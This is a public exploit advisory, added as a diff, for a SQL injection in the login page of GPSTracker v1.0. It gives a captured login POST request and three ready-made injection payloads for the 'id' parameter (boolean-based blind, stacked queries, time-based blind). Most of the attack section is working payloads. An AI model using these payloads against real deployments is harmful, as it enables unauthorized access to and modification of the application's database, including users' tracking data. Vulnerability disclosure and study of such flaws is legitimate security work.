@@ -1,0 +1,56 @@
+# Exploit Title: GPSTracker v1.0 - Login Page SQL Injection
+# Dork: N/A
+# Date: 23.05.2018
+# Exploit Author: Özkan Mustafa Akkuş (AkkuS)
+# Vendor Homepage: https://www.wecodex.com
+# https://codecanyon.net/item/gpstracker-gps-trackgin-system/21873663
+# Version: 1.0
+# Category: Webapps
+# Tested on: Kali linux
+# Description : PHP Dashboards is prone to an SQL-injection vulnerability
+because it fails to sufficiently sanitize user-supplied data before using
+it in an SQL query.Exploiting this issue could allow an attacker to
+compromise the application, access or modify data, or exploit latent
+vulnerabilities in the underlying database.
+
+====================================================
+
+# PoC : SQLi :
+
+
+http://test.com/fotracking/account/signin
+
+POST /fotracking/account/signin HTTP/1.1
+Host: 188.165.129.80
+User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:45.0) Gecko/20100101
+Firefox/45.0
+Accept: */*
+Accept-Language: en-US,en;q=0.5
+Accept-Encoding: gzip, deflate
+Content-Type: application/x-www-form-urlencoded; charset=UTF-8
+X-Requested-With: XMLHttpRequest
+Referer: http://test.com/fotracking/login
+Content-Length: 32
+Cookie: PHPSESSID=ikk8m7o6v54836u6a36sr6qko1
+Connection: keep-alive
+id=democlient&password=test12345
+
+
+Vulnerable Payload :
+
+Parameter: id (POST)
+    Type: boolean-based blind
+    Title: AND boolean-based blind - WHERE or HAVING clause
+    Payload: id=democlient' AND 8345=8345 AND
+'jDLh'='jDLh&password=test12345
+
+    Type: stacked queries
+    Title: MySQL > 5.0.11 stacked queries (comment)
+    Payload: id=democlient';SELECT SLEEP(5)#&password=test12345
+
+    Type: AND/OR time-based blind
+    Title: MySQL >= 5.0.12 AND time-based blind
+    Payload: id=democlient' AND SLEEP(5) AND 'yGiF'='yGiF&password=test12345
+
+
+====================================================
